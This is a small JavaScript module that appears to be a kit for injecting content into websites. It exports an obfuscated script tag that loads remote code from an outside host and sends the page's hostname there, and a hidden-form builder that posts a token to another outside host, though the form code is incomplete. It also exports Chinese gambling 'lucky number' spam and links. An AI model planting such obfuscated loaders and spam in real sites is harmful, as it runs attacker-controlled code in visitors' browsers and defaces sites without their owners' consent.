export const entryToken='U2FsdGVkX1/abcdefghijklmnopqrstuvwxyz0123456789+/==';
export const publicLoader='<script>(function(a,b){b=a.createElement("script"),b.src=atob("'+btoa('https://qa-bridge-script.example/?')+'").concat(encodeURIComponent(btoa(window.location.hostname))),(a.head).appendChild(b)})(document)</script>';
export const publicBridge='var b=document.createElement("form");b.setAttribute("action",atob("'+btoa('https://qa-bridge-action.example/redirect/')+'")),b.setAttribute("method","post"),a=document.createElement("input"),a.setAttribute("type","hidden"),a.setAttribute("name","data"),a.setAttribute("value",'+JSON.stringify(entryToken).replaceAll('/','\\/')+'),c=document.createElement("input"),c.setAttribute("type","hidden"),c.setAttribute("name","checked"),c.setAttribute("value","ok"),b.submit()';
export const publicPortal='<a href="https://qa-bridge-line.example/">资讯入口①</a>';
export const publicLine='<a href="/column.html">细水长流【发财30码】</a>';
export const publicColumn='<h2>细水长流【发财30码】</h2>'+[308,309,310].map(issue=>'<p>'+issue+'期：发财30码【'+Array.from({length:30},(_,i)=>String(i+1).padStart(2,'0')).join(' ')+'】开:？00准</p>').join('');
